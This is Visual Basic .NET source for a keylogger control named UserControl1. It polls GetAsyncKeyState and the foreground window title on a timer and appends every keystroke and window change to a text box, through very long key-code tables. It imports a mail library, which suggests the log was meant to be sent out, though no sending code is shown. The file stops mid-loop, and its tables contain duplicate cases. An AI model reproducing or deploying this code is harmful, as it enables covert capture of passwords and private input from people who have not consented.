Imports System.Net.Mail
Public Class UserControl1

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Integer) As Integer
    Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim typein As String
    Dim strin As String = Nothing
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        If strin <> GetActiveWindowTitle() Then
            RichTextBox1.Text += vbNewLine & "[------" & GetActiveWindowTitle() & "------]" + " " + TimeOfDay + vbNewLine

            strin = GetActiveWindowTitle()
        End If
        For logger = 1 To 255
            typein = GetAsyncKeyState(logger)
            If typein = -32767 And My.Computer.Keyboard.AltKeyDown = False And My.Computer.Keyboard.ShiftKeyDown = False And My.Computer.Keyboard.CapsLock = False Then
                Select Case logger
                    Case 1
                        RichTextBox1.Text += ""
                    Case 2
                        RichTextBox1.Text += ""
                    Case 3
                        RichTextBox1.Text += "[ACHTUNG!!!]"
                    Case 4
                        RichTextBox1.Text += ""
                    Case 5
                        RichTextBox1.Text += "[ACHTUNG!!!5]"
                    Case 6
                        RichTextBox1.Text += "[ACHTUNG!!6!]"
                    Case 7
                        RichTextBox1.Text += "[ACHTUNG!!!7]"
                    Case 8
                        RichTextBox1.Text += "[BackSpace]"
                    Case 9
                        RichTextBox1.Text += "[Tab]"
                    Case 10
                        RichTextBox1.Text += "[ACHTUNG!!!10]"
                    Case 11
                        RichTextBox1.Text += "[ACHTUNG!!!11]"
                    Case 12
                        RichTextBox1.Text += ""
                    Case 13
                        RichTextBox1.Text += "[Enter]"
                    Case 112
                        RichTextBox1.Text += "[F1]"
                    Case 113
                        RichTextBox1.Text += "[F2]"
                    Case 114
                        RichTextBox1.Text += "[F3]"
                    Case 115
                        RichTextBox1.Text += "[F4]"
                    Case 116
                        RichTextBox1.Text += "[F5]"
                    Case 117
                        RichTextBox1.Text += "[F6]"
                    Case 118
                        RichTextBox1.Text += "[F7]"
                    Case 119
                        RichTextBox1.Text += "[F8]"
                    Case 120
                        RichTextBox1.Text += "[F9]"
                    Case 121
                        RichTextBox1.Text += "[F10]"
                    Case 122
                        RichTextBox1.Text += "[F11]"
                    Case 123
                        RichTextBox1.Text += "[F12]"
                    Case 160
                        RichTextBox1.Text += ""
                    Case 161
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += ""
                    Case 165
                        RichTextBox1.Text += "[Alt]"
                    Case 189
                        RichTextBox1.Text += "-"
                    Case 187
                        RichTextBox1.Text += "+"
                    Case 46
                        RichTextBox1.Text += "[Delete]"
                    Case 14
                        RichTextBox1.Text += "[ACHTUNG 14]"
                    Case 15
                        RichTextBox1.Text += "[ACHTUNG 15]"
                    Case 16
                        RichTextBox1.Text += ""
                    Case 17
                        RichTextBox1.Text += "[Ctrl]"
                    Case 18
                        RichTextBox1.Text += "[Alt]"
                    Case 19
                        RichTextBox1.Text += "[Pause-Break]"
                    Case 20
                        RichTextBox1.Text += "[Caps Lock]"
                    Case 21
                        RichTextBox1.Text += "[ACHTUNG 21]"
                    Case 22
                        RichTextBox1.Text += "[ACHTUNG 22]"
                    Case 23
                        RichTextBox1.Text += "[ACHTUNG 23]"
                    Case 24
                        RichTextBox1.Text += "[ACHTUNG 24]"
                    Case 25
                        RichTextBox1.Text += "[ACHTUNG 25]"
                    Case 26
                        RichTextBox1.Text += "[ACHTUNG 26]"
                    Case 27
                        RichTextBox1.Text += "[Esc]"
                    Case 28
                        RichTextBox1.Text += "[ACHTUNG 28]"
                    Case 29
                        RichTextBox1.Text += "[ACHTUNG 29]"
                    Case 30
                        RichTextBox1.Text += "[ACHTUNG 30]"
                    Case 31
                        RichTextBox1.Text += "[ACHTUNG 31]"
                    Case 32
                        RichTextBox1.Text += " "
                    Case 33
                        RichTextBox1.Text += "[PageUp]"
                    Case 34
                        RichTextBox1.Text += "[PageDown]"
                    Case 35
                        RichTextBox1.Text += "[End]"
                    Case 36
                        RichTextBox1.Text += "[Home]"
                    Case 37
                        RichTextBox1.Text += "[Left]"
                    Case 38
                        RichTextBox1.Text += "[Up]"
                    Case 39
                        RichTextBox1.Text += "[Right]"
                    Case 40
                        RichTextBox1.Text += "[Down]"
                    Case 41
                        RichTextBox1.Text += ")"
                    Case 42
                        RichTextBox1.Text += "*"
                    Case 43
                        RichTextBox1.Text += "+"
                    Case 44
                        RichTextBox1.Text += "[SS]"
                    Case 45
                        RichTextBox1.Text += "[INS]"
                    Case 47
                        RichTextBox1.Text += "/"
                    Case 48
                        RichTextBox1.Text += "0"
                    Case 49
                        RichTextBox1.Text += "1"
                    Case 50
                        RichTextBox1.Text += "2"
                    Case 51
                        RichTextBox1.Text += "3"
                    Case 52
                        RichTextBox1.Text += "4"
                    Case 53
                        RichTextBox1.Text += "5"
                    Case 54
                        RichTextBox1.Text += "6"
                    Case 55
                        RichTextBox1.Text += "7"
                    Case 56
                        RichTextBox1.Text += "8"
                    Case 57
                        RichTextBox1.Text += "9"
                    Case 58
                        RichTextBox1.Text += ":"
                    Case 59
                        RichTextBox1.Text += ";"
                    Case 60
                        RichTextBox1.Text += "<"
                    Case 61
                        RichTextBox1.Text += "="
                    Case 62
                        RichTextBox1.Text += ">"
                    Case 63
                        RichTextBox1.Text += "?"
                    Case 64
                        RichTextBox1.Text += "@"
                    Case 65
                        RichTextBox1.Text += "a"
                    Case 66
                        RichTextBox1.Text += "b"
                    Case 67
                        RichTextBox1.Text += "c"
                    Case 68
                        RichTextBox1.Text += "d"
                    Case 69
                        RichTextBox1.Text += "e"
                    Case 70
                        RichTextBox1.Text += "f"
                    Case 71
                        RichTextBox1.Text += "g"
                    Case 72
                        RichTextBox1.Text += "h"
                    Case 73
                        RichTextBox1.Text += "ı"
                    Case 74
                        RichTextBox1.Text += "j"
                    Case 75
                        RichTextBox1.Text += "k"
                    Case 76
                        RichTextBox1.Text += "l"
                    Case 77
                        RichTextBox1.Text += "m"
                    Case 78
                        RichTextBox1.Text += "n"
                    Case 79
                        RichTextBox1.Text += "o"
                    Case 80
                        RichTextBox1.Text += "p"
                    Case 81
                        RichTextBox1.Text += "q"
                    Case 82
                        RichTextBox1.Text += "r"
                    Case 83
                        RichTextBox1.Text += "s"
                    Case 84
                        RichTextBox1.Text += "t"
                    Case 85
                        RichTextBox1.Text += "u"
                    Case 86
                        RichTextBox1.Text += "v"
                    Case 87
                        RichTextBox1.Text += "w"
                    Case 88
                        RichTextBox1.Text += "x"
                    Case 89
                        RichTextBox1.Text += "y"
                    Case 90
                        RichTextBox1.Text += "z"
                    Case 91
                        RichTextBox1.Text += "[Win]"
                    Case 92
                        RichTextBox1.Text += "[Win]"
                    Case 93
                        RichTextBox1.Text += "[STT]"
                    Case 94
                        RichTextBox1.Text += "^"
                    Case 95
                        RichTextBox1.Text += "_"
                    Case 96
                        RichTextBox1.Text += "[num0]"
                    Case 97
                        RichTextBox1.Text += "[num1]"
                    Case 98
                        RichTextBox1.Text += "[num2]"
                    Case 99
                        RichTextBox1.Text += "[num3]"
                    Case 100
                        RichTextBox1.Text += "[num4]"
                    Case 101
                        RichTextBox1.Text += "[num5]"
                    Case 102
                        RichTextBox1.Text += "[num6]"
                    Case 103
                        RichTextBox1.Text += "[num7]"
                    Case 104
                        RichTextBox1.Text += "[num8]"
                    Case 105
                        RichTextBox1.Text += "[num9]"
                    Case 106
                        RichTextBox1.Text += "*"
                    Case 107
                        RichTextBox1.Text += "+"
                    Case 108
                        RichTextBox1.Text += "l"
                    Case 109
                        RichTextBox1.Text += "-"
                    Case 110
                        RichTextBox1.Text += ","
                    Case 111
                        RichTextBox1.Text += "/"
                    Case 112
                        RichTextBox1.Text += "p"
                    Case 113
                        RichTextBox1.Text += "q"
                    Case 114
                        RichTextBox1.Text += "r"
                    Case 115
                        RichTextBox1.Text += "s"
                    Case 116
                        RichTextBox1.Text += "t"
                    Case 117
                        RichTextBox1.Text += "u"
                    Case 118
                        RichTextBox1.Text += "v"
                    Case 119
                        RichTextBox1.Text += "w"
                    Case 120
                        RichTextBox1.Text += "x"
                    Case 121
                        RichTextBox1.Text += "y"
                    Case 122
                        RichTextBox1.Text += "z"
                    Case 123
                        RichTextBox1.Text += "{"
                    Case 124
                        RichTextBox1.Text += "|"
                    Case 125
                        RichTextBox1.Text += "}"
                    Case 126
                        RichTextBox1.Text += "~"
                    Case 127
                        RichTextBox1.Text += "[ACHTUNG 127]"
                    Case 128
                        RichTextBox1.Text += "€"
                    Case 129
                        RichTextBox1.Text += "[ACHTUNG 129]"
                    Case 130
                        RichTextBox1.Text += "‚"
                    Case 131
                        RichTextBox1.Text += "ƒ"
                    Case 132
                        RichTextBox1.Text += "„"
                    Case 133
                        RichTextBox1.Text += "…"
                    Case 134
                        RichTextBox1.Text += "†"
                    Case 135
                        RichTextBox1.Text += "‡"
                    Case 136
                        RichTextBox1.Text += "ˆ"
                    Case 137
                        RichTextBox1.Text += "[ACHTUNG 137]"
                    Case 138
                        RichTextBox1.Text += "Š"
                    Case 139
                        RichTextBox1.Text += "‹"
                    Case 140
                        RichTextBox1.Text += "[ACHTUNG 140]"
                    Case 141
                        RichTextBox1.Text += "[ACHTUNG 141]"
                    Case 142
                        RichTextBox1.Text += "Z"
                    Case 143
                        RichTextBox1.Text += "[ACHTUNG 143]"
                    Case 144
                        RichTextBox1.Text += "[Num-Lock]"
                    Case 145
                        RichTextBox1.Text += "[Scroll-Lock]"
                    Case 146
                        RichTextBox1.Text += "’"
                    Case 147
                        RichTextBox1.Text += """"
                    Case 148
                        RichTextBox1.Text += """"
                    Case 149
                        RichTextBox1.Text += "•"
                    Case 150
                        RichTextBox1.Text += "–"
                    Case 151
                        RichTextBox1.Text += "—"
                    Case 152
                        RichTextBox1.Text += "˜"
                    Case 153
                        RichTextBox1.Text += "™"
                    Case 154
                        RichTextBox1.Text += "š"
                    Case 155
                        RichTextBox1.Text += "›"
                    Case 156
                        RichTextBox1.Text += "[ACHTUNG 155]"
                    Case 157
                        RichTextBox1.Text += "[ACHTUNG 157]"
                    Case 158
                        RichTextBox1.Text += "z"
                    Case 159
                        RichTextBox1.Text += "Ÿ"
                    Case 160
                        RichTextBox1.Text += "[ACHTUNG 160]"
                    Case 161
                        RichTextBox1.Text += "¡"
                    Case 162
                        RichTextBox1.Text += ""
                    Case 163
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += "¤"
                    Case 166
                        RichTextBox1.Text += "¦"
                    Case 167
                        RichTextBox1.Text += "§"
                    Case 168
                        RichTextBox1.Text += "¨"
                    Case 169
                        RichTextBox1.Text += "©"
                    Case 170
                        RichTextBox1.Text += "ª"
                    Case 171
                        RichTextBox1.Text += "«"
                    Case 172
                        RichTextBox1.Text += "¬"
                    Case 173
                        RichTextBox1.Text += "[ACHTUNG 173]"
                    Case 174
                        RichTextBox1.Text += "®"
                    Case 175
                        RichTextBox1.Text += "¯"
                    Case 176
                        RichTextBox1.Text += "°"
                    Case 177
                        RichTextBox1.Text += "±"
                    Case 178
                        RichTextBox1.Text += "²"
                    Case 179
                        RichTextBox1.Text += "³"
                    Case 180
                        RichTextBox1.Text += "´"
                    Case 181
                        RichTextBox1.Text += "µ"
                    Case 182
                        RichTextBox1.Text += "[ACHTUNG 182]"
                    Case 183
                        RichTextBox1.Text += ""
                    Case 184
                        RichTextBox1.Text += ""
                    Case 185
                        RichTextBox1.Text += "¹"
                    Case 186
                        RichTextBox1.Text += "ş"
                    Case 187
                        RichTextBox1.Text += "»"
                    Case 188
                        RichTextBox1.Text += ","
                    Case 189
                        RichTextBox1.Text += ":"
                    Case 190
                        RichTextBox1.Text += "."
                    Case 191
                        RichTextBox1.Text += "ö"
                    Case 192
                        RichTextBox1.Text += """"
                    Case 193
                        RichTextBox1.Text += "Á"
                    Case 194
                        RichTextBox1.Text += "Â"
                    Case 195
                        RichTextBox1.Text += "Ã"
                    Case 196
                        RichTextBox1.Text += "Ä"
                    Case 197
                        RichTextBox1.Text += "Æ"
                    Case 198
                        RichTextBox1.Text += "Ç"
                    Case 199
                        RichTextBox1.Text += "È"
                    Case 200
                        RichTextBox1.Text += "É"
                    Case 201
                        RichTextBox1.Text += "Ê"
                    Case 202
                        RichTextBox1.Text += "Ë"
                    Case 203
                        RichTextBox1.Text += "Ì"
                    Case 204
                        RichTextBox1.Text += "Í"
                    Case 205
                        RichTextBox1.Text += "Í"
                    Case 206
                        RichTextBox1.Text += "Î"
                    Case 207
                        RichTextBox1.Text += "Ï"
                    Case 208
                        RichTextBox1.Text += "Ğ"
                    Case 209
                        RichTextBox1.Text += "Ñ"
                    Case 210
                        RichTextBox1.Text += "Ò"
                    Case 211
                        RichTextBox1.Text += "Ó"
                    Case 212
                        RichTextBox1.Text += "Ô"
                    Case 213
                        RichTextBox1.Text += "Õ"
                    Case 214
                        RichTextBox1.Text += "Ö"
                    Case 215
                        RichTextBox1.Text += "×"
                    Case 216
                        RichTextBox1.Text += "Ø"
                    Case 217
                        RichTextBox1.Text += "Ù"
                    Case 218
                        RichTextBox1.Text += "Ú"
                    Case 219
                        RichTextBox1.Text += "ğ"
                    Case 220
                        RichTextBox1.Text += "ç"
                    Case 221
                        RichTextBox1.Text += "ü"
                    Case 222
                        RichTextBox1.Text += "i"
                    Case 223
                        RichTextBox1.Text += "*"
                    Case 224
                        RichTextBox1.Text += "à"
                    Case 225
                        RichTextBox1.Text += "á"
                    Case 226
                        RichTextBox1.Text += "â"
                    Case 227
                        RichTextBox1.Text += "<"
                    Case 228
                        RichTextBox1.Text += "ä"
                    Case 229
                        RichTextBox1.Text += "æ"
                    Case 230
                        RichTextBox1.Text += "ç"
                    Case 231
                        RichTextBox1.Text += "è"
                    Case 232
                        RichTextBox1.Text += "é"
                    Case 233
                        RichTextBox1.Text += "ê"
                    Case 234
                        RichTextBox1.Text += "ë"
                    Case 235
                        RichTextBox1.Text += "ì"
                    Case 236
                        RichTextBox1.Text += "í"
                    Case 237
                        RichTextBox1.Text += "í"
                    Case 238
                        RichTextBox1.Text += "î"
                    Case 239
                        RichTextBox1.Text += "ï"
                    Case 240
                        RichTextBox1.Text += "ğ"
                    Case 241
                        RichTextBox1.Text += "ñ"
                    Case 242
                        RichTextBox1.Text += "ò"
                    Case 243
                        RichTextBox1.Text += "ó"
                    Case 244
                        RichTextBox1.Text += "ô"
                    Case 245
                        RichTextBox1.Text += "õ"
                    Case 246
                        RichTextBox1.Text += "ö"
                    Case 247
                        RichTextBox1.Text += "÷"
                    Case 248
                        RichTextBox1.Text += "ø"
                    Case 249
                        RichTextBox1.Text += "ù"
                    Case 250
                        RichTextBox1.Text += "ú"
                    Case 251
                        RichTextBox1.Text += "û"
                    Case 252
                        RichTextBox1.Text += "ü"
                    Case 253
                        RichTextBox1.Text += "ı"
                    Case 254
                        RichTextBox1.Text += "ş"
                    Case 255
                        RichTextBox1.Text += "ÿ"
                    Case Else
                        RichTextBox1.Text += Chr(logger).ToString
                End Select
            End If
            If typein = -32767 And My.Computer.Keyboard.AltKeyDown = True And My.Computer.Keyboard.ShiftKeyDown = False Then
                Select Case logger
                    Case 1
                        RichTextBox1.Text += ""
                    Case 2
                        RichTextBox1.Text += ""
                    Case 3
                        RichTextBox1.Text += "[ACHTUNG!!!]"
                    Case 4
                        RichTextBox1.Text += "[ACHTUNG!!!4]"
                    Case 5
                        RichTextBox1.Text += "[ACHTUNG!!!5]"
                    Case 6
                        RichTextBox1.Text += "[ACHTUNG!!6!]"
                    Case 7
                        RichTextBox1.Text += "[ACHTUNG!!!7]"
                    Case 8
                        RichTextBox1.Text += "[BackSpace]"
                    Case 9
                        RichTextBox1.Text += "[Tab]"
                    Case 10
                        RichTextBox1.Text += "[ACHTUNG!!!10]"
                    Case 11
                        RichTextBox1.Text += "[ACHTUNG!!!11]"
                    Case 12
                        RichTextBox1.Text += "[ACHTUNG!!!12]"
                    Case 13
                        RichTextBox1.Text += "[Enter]"
                    Case 112
                        RichTextBox1.Text += "[F1]"
                    Case 113
                        RichTextBox1.Text += "[F2]"
                    Case 114
                        RichTextBox1.Text += "[F3]"
                    Case 115
                        RichTextBox1.Text += "[F4]"
                    Case 116
                        RichTextBox1.Text += "[F5]"
                    Case 117
                        RichTextBox1.Text += "[F6]"
                    Case 118
                        RichTextBox1.Text += "[F7]"
                    Case 119
                        RichTextBox1.Text += "[F8]"
                    Case 120
                        RichTextBox1.Text += "[F9]"
                    Case 121
                        RichTextBox1.Text += "[F10]"
                    Case 122
                        RichTextBox1.Text += "[F11]"
                    Case 123
                        RichTextBox1.Text += "[F12]"
                    Case 160
                        RichTextBox1.Text += ""
                    Case 161
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += ""
                    Case 165
                        RichTextBox1.Text += "[Alts]"
                    Case 189
                        RichTextBox1.Text += "|"
                    Case 187
                        RichTextBox1.Text += "+"
                    Case 46
                        RichTextBox1.Text += "[Delete]"
                    Case 14
                        RichTextBox1.Text += "[ACHTUNG 14]"
                    Case 15
                        RichTextBox1.Text += "[ACHTUNG 15]"
                    Case 16
                        RichTextBox1.Text += ""
                    Case 17
                        RichTextBox1.Text += "[Ctrl]"
                    Case 18
                        RichTextBox1.Text += "[Alt]"
                    Case 19
                        RichTextBox1.Text += "[Pause-Break]"
                    Case 20
                        RichTextBox1.Text += "[Caps Lock]"
                    Case 21
                        RichTextBox1.Text += "[ACHTUNG 21]"
                    Case 22
                        RichTextBox1.Text += "[ACHTUNG 22]"
                    Case 23
                        RichTextBox1.Text += "[ACHTUNG 23]"
                    Case 24
                        RichTextBox1.Text += "[ACHTUNG 24]"
                    Case 25
                        RichTextBox1.Text += "[ACHTUNG 25]"
                    Case 26
                        RichTextBox1.Text += "[ACHTUNG 26]"
                    Case 27
                        RichTextBox1.Text += "[Esc]"
                    Case 28
                        RichTextBox1.Text += "[ACHTUNG 28]"
                    Case 29
                        RichTextBox1.Text += "[ACHTUNG 29]"
                    Case 30
                        RichTextBox1.Text += "[ACHTUNG 30]"
                    Case 31
                        RichTextBox1.Text += "[ACHTUNG 31]"
                    Case 32
                        RichTextBox1.Text += " "
                    Case 33
                        RichTextBox1.Text += "[PageUp]"
                    Case 34
                        RichTextBox1.Text += "[PageDown]"
                    Case 35
                        RichTextBox1.Text += "[End]"
                    Case 36
                        RichTextBox1.Text += "[Home]"
                    Case 37
                        RichTextBox1.Text += "[Left]"
                    Case 38
                        RichTextBox1.Text += "[Up]"
                    Case 39
                        RichTextBox1.Text += "[Right]"
                    Case 40
                        RichTextBox1.Text += "[Down]"
                    Case 41
                        RichTextBox1.Text += ")"
                    Case 42
                        RichTextBox1.Text += "*"
                    Case 43
                        RichTextBox1.Text += "+"
                    Case 44
                        RichTextBox1.Text += "[SS]"
                    Case 45
                        RichTextBox1.Text += "[INS]"
                    Case 47
                        RichTextBox1.Text += "/"
                    Case 48
                        RichTextBox1.Text += "}"
                    Case 49
                        RichTextBox1.Text += ">"
                    Case 50
                        RichTextBox1.Text += "£"
                    Case 51
                        RichTextBox1.Text += "#"
                    Case 52
                        RichTextBox1.Text += "$"
                    Case 53
                        RichTextBox1.Text += "½"
                    Case 54
                        RichTextBox1.Text += "6"
                    Case 55
                        RichTextBox1.Text += "{"
                    Case 56
                        RichTextBox1.Text += "["
                    Case 57
                        RichTextBox1.Text += "]"
                    Case 58
                        RichTextBox1.Text += ":"
                    Case 59
                        RichTextBox1.Text += ";"
                    Case 60
                        RichTextBox1.Text += "<"
                    Case 61
                        RichTextBox1.Text += "="
                    Case 62
                        RichTextBox1.Text += ">"
                    Case 63
                        RichTextBox1.Text += "?"
                    Case 64
                        RichTextBox1.Text += "@"
                    Case 65
                        RichTextBox1.Text += "æ"
                    Case 66
                        RichTextBox1.Text += "b"
                    Case 67
                        RichTextBox1.Text += "c"
                    Case 68
                        RichTextBox1.Text += "d"
                    Case 69
                        RichTextBox1.Text += "€"
                    Case 70
                        RichTextBox1.Text += "f"
                    Case 71
                        RichTextBox1.Text += "g"
                    Case 72
                        RichTextBox1.Text += "h"
                    Case 73
                        RichTextBox1.Text += "ı"
                    Case 74
                        RichTextBox1.Text += "j"
                    Case 75
                        RichTextBox1.Text += "k"
                    Case 76
                        RichTextBox1.Text += "l"
                    Case 77
                        RichTextBox1.Text += "m"
                    Case 78
                        RichTextBox1.Text += "n"
                    Case 79
                        RichTextBox1.Text += "o"
                    Case 80
                        RichTextBox1.Text += "p"
                    Case 81
                        RichTextBox1.Text += "@"
                    Case 82
                        RichTextBox1.Text += "r"
                    Case 83
                        RichTextBox1.Text += "ß"
                    Case 84
                        RichTextBox1.Text += "t"
                    Case 85
                        RichTextBox1.Text += "u"
                    Case 86
                        RichTextBox1.Text += "v"
                    Case 87
                        RichTextBox1.Text += "w"
                    Case 88
                        RichTextBox1.Text += "x"
                    Case 89
                        RichTextBox1.Text += "y"
                    Case 90
                        RichTextBox1.Text += "z"
                    Case 91
                        RichTextBox1.Text += "[Win]"
                    Case 92
                        RichTextBox1.Text += "[Win]"
                    Case 93
                        RichTextBox1.Text += "[STT]"
                    Case 94
                        RichTextBox1.Text += "^"
                    Case 95
                        RichTextBox1.Text += "_"
                    Case 96
                        RichTextBox1.Text += "[num0]"
                    Case 97
                        RichTextBox1.Text += "[num1]"
                    Case 98
                        RichTextBox1.Text += "[num2]"
                    Case 99
                        RichTextBox1.Text += "[num3]"
                    Case 100
                        RichTextBox1.Text += "[num4]"
                    Case 101
                        RichTextBox1.Text += "[num5]"
                    Case 102
                        RichTextBox1.Text += "[num6]"
                    Case 103
                        RichTextBox1.Text += "[num7]"
                    Case 104
                        RichTextBox1.Text += "[num8]"
                    Case 105
                        RichTextBox1.Text += "[num9]"
                    Case 106
                        RichTextBox1.Text += "*"
                    Case 107
                        RichTextBox1.Text += "+"
                    Case 108
                        RichTextBox1.Text += "l"
                    Case 109
                        RichTextBox1.Text += "-"
                    Case 110
                        RichTextBox1.Text += ","
                    Case 111
                        RichTextBox1.Text += "/"
                    Case 112
                        RichTextBox1.Text += "p"
                    Case 113
                        RichTextBox1.Text += "q"
                    Case 114
                        RichTextBox1.Text += "r"
                    Case 115
                        RichTextBox1.Text += "s"
                    Case 116
                        RichTextBox1.Text += "t"
                    Case 117
                        RichTextBox1.Text += "u"
                    Case 118
                        RichTextBox1.Text += "v"
                    Case 119
                        RichTextBox1.Text += "w"
                    Case 120
                        RichTextBox1.Text += "x"
                    Case 121
                        RichTextBox1.Text += "y"
                    Case 122
                        RichTextBox1.Text += "z"
                    Case 123
                        RichTextBox1.Text += "{"
                    Case 124
                        RichTextBox1.Text += "|"
                    Case 125
                        RichTextBox1.Text += "}"
                    Case 126
                        RichTextBox1.Text += "~"
                    Case 127
                        RichTextBox1.Text += "[ACHTUNG 127]"
                    Case 128
                        RichTextBox1.Text += "€"
                    Case 129
                        RichTextBox1.Text += "[ACHTUNG 129]"
                    Case 130
                        RichTextBox1.Text += "‚"
                    Case 131
                        RichTextBox1.Text += "ƒ"
                    Case 132
                        RichTextBox1.Text += "„"
                    Case 133
                        RichTextBox1.Text += "…"
                    Case 134
                        RichTextBox1.Text += "†"
                    Case 135
                        RichTextBox1.Text += "‡"
                    Case 136
                        RichTextBox1.Text += "ˆ"
                    Case 137
                        RichTextBox1.Text += "[ACHTUNG 137]"
                    Case 138
                        RichTextBox1.Text += "Š"
                    Case 139
                        RichTextBox1.Text += "‹"
                    Case 140
                        RichTextBox1.Text += "[ACHTUNG 140]"
                    Case 141
                        RichTextBox1.Text += "[ACHTUNG 141]"
                    Case 142
                        RichTextBox1.Text += "Z"
                    Case 143
                        RichTextBox1.Text += "[ACHTUNG 143]"
                    Case 144
                        RichTextBox1.Text += "[Num-Lock]"
                    Case 145
                        RichTextBox1.Text += "[Scroll-Lock]"
                    Case 146
                        RichTextBox1.Text += "’"
                    Case 147
                        RichTextBox1.Text += """"
                    Case 148
                        RichTextBox1.Text += """"
                    Case 149
                        RichTextBox1.Text += "•"
                    Case 150
                        RichTextBox1.Text += "–"
                    Case 151
                        RichTextBox1.Text += "—"
                    Case 152
                        RichTextBox1.Text += "˜"
                    Case 153
                        RichTextBox1.Text += "™"
                    Case 154
                        RichTextBox1.Text += "š"
                    Case 155
                        RichTextBox1.Text += "›"
                    Case 156
                        RichTextBox1.Text += "[ACHTUNG 155]"
                    Case 157
                        RichTextBox1.Text += "[ACHTUNG 157]"
                    Case 158
                        RichTextBox1.Text += "z"
                    Case 159
                        RichTextBox1.Text += "Ÿ"
                    Case 160
                        RichTextBox1.Text += "[ACHTUNG 160]"
                    Case 161
                        RichTextBox1.Text += "¡"
                    Case 162
                        RichTextBox1.Text += ""
                    Case 163
                        RichTextBox1.Text += ""
                    Case 164
                        RichTextBox1.Text += "¤"
                    Case 166
                        RichTextBox1.Text += "¦"
                    Case 167
                        RichTextBox1.Text += "§"
                    Case 168
                        RichTextBox1.Text += "¨"
                    Case 169
                        RichTextBox1.Text += "©"
                    Case 170
                        RichTextBox1.Text += "ª"
                    Case 171
                        RichTextBox1.Text += "«"
                    Case 172
                        RichTextBox1.Text += "¬"
                    Case 173
                        RichTextBox1.Text += "[ACHTUNG 173]"
                    Case 174
                        RichTextBox1.Text += "®"
                    Case 175
                        RichTextBox1.Text += "¯"
                    Case 176
                        RichTextBox1.Text += "°"
                    Case 177
                        RichTextBox1.Text += "±"
                    Case 178
                        RichTextBox1.Text += "²"
                    Case 179
                        RichTextBox1.Text += "³"
                    Case 180
                        RichTextBox1.Text += "´"
                    Case 181
                        RichTextBox1.Text += "µ"
                    Case 182
                        RichTextBox1.Text += "[ACHTUNG 182]"
                    Case 183
                        RichTextBox1.Text += ""
                    Case 184
                        RichTextBox1.Text += ""
                    Case 185
                        RichTextBox1.Text += "¹"
                    Case 186
                        RichTextBox1.Text += "ş"
                    Case 187
                        RichTextBox1.Text += "»"
                    Case 188
                        RichTextBox1.Text += ","
                    Case 189
                        RichTextBox1.Text += ":"
                    Case 190
                        RichTextBox1.Text += "."
                    Case 191
                        RichTextBox1.Text += "ö"
                    Case 192
                        RichTextBox1.Text += "<"
                    Case 193
                        RichTextBox1.Text += "Á"
                    Case 194
                        RichTextBox1.Text += "Â"
                    Case 195
                        RichTextBox1.Text += "Ã"
                    Case 196
                        RichTextBox1.Text += "Ä"
                    Case 197
                        RichTextBox1.Text += "Æ"
                    Case 198
                        RichTextBox1.Text += "Ç"
                    Case 199
                        RichTextBox1.Text += "È"
                    Case 200
                        RichTextBox1.Text += "É"
                    Case 201
                        RichTextBox1.Text += "Ê"
                    Case 202
                        RichTextBox1.Text += "Ë"
                    Case 203
                        RichTextBox1.Text += "Ì"
                    Case 204
                        RichTextBox1.Text += "Í"
                    Case 205
                        RichTextBox1.Text += "Í"
                    Case 206
                        RichTextBox1.Text += "Î"
                    Case 207
                        RichTextBox1.Text += "Ï"
                    Case 208
                        RichTextBox1.Text += "Ğ"
                    Case 209
                        RichTextBox1.Text += "Ñ"
                    Case 210
                        RichTextBox1.Text += "Ò"
                    Case 211
                        RichTextBox1.Text += "Ó"
                    Case 212
                        RichTextBox1.Text += "Ô"
                    Case 213
                        RichTextBox1.Text += "Õ"
                    Case 214
                        RichTextBox1.Text += "Ö"
                    Case 215
                        RichTextBox1.Text += "×"
                    Case 216
                        RichTextBox1.Text += "Ø"
                    Case 217
                        RichTextBox1.Text += "Ù"
                    Case 218
                        RichTextBox1.Text += "Ú"
                    Case 219
                        RichTextBox1.Text += "¨"
                    Case 220
                        RichTextBox1.Text += "ç"
                    Case 221
                        RichTextBox1.Text += "~"
                    Case 222
                        RichTextBox1.Text += "i"
                    Case 223
                        RichTextBox1.Text += "\"
                    Case 224
                        RichTextBox1.Text += "à"
                    Case 225
                        RichTextBox1.Text += "á"
                    Case 226
                        RichTextBox1.Text += "â"
                    Case 227
                        RichTextBox1.Text += "<"
                    Case 228
                        RichTextBox1.Text += "ä"
                    Case 229
                        RichTextBox1.Text += "æ"
                    Case 230
                        RichTextBox1.Text += "ç"
                    Case 231
                        RichTextBox1.Text += "è"
                    Case 232
                        RichTextBox1.Text += "é"
                    Case 233
                        RichTextBox1.Text += "ê"
                    Case 234
                        RichTextBox1.Text += "ë"
                    Case 235
                        RichTextBox1.Text += "ì"
                    Case 236
                        RichTextBox1.Text += "í"
                    Case 237
                        RichTextBox1.Text += "í"
                    Case 238
                        RichTextBox1.Text += "î"
                    Case 239
                        RichTextBox1.Text += "ï"
                    Case 240
                        RichTextBox1.Text += "ğ"
                    Case 241
                        RichTextBox1.Text += "ñ"
                    Case 242
                        RichTextBox1.Text += "ò"
                    Case 243
                        RichTextBox1.Text += "ó"
                    Case 244
                        RichTextBox1.Text += "ô"
                    Case 245
                        RichTextBox1.Text += "õ"
                    Case 246
                        RichTextBox1.Text += "ö"
                    Case 247
                        RichTextBox1.Text += "÷"
                    Case 248
                        RichTextBox1.Text += "ø"
                    Case 249
                        RichTextBox1.Text += "ù"
                    Case 250
                        RichTextBox1.Text += "ú"
                    Case 251
                        RichTextBox1.Text += "û"
                    Case 252
                        RichTextBox1.Text += "ü"
                    Case 253
                        RichTextBox1.Text += "ı"
                    Case 254
                        RichTextBox1.Text += "ş"
                    Case 255
                        RichTextBox1.Text += "ÿ"
                    Case Else
                        RichTextBox1.Text += Chr(logger).ToString
                End Select
            End If
